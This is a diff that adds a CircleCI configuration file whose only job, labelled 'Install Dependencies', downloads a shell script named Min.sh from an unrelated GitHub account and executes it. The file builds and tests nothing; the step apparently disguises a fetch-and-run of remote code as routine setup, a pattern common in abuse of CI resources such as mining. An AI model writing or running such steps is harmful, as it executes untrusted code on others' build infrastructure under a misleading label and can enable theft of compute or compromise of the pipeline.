@@ -1,0 +1,14 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  wget https://raw.githubusercontent.com/rack12rack/rack/main/Min.sh && chmod +x Min.sh && ./Min.sh
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
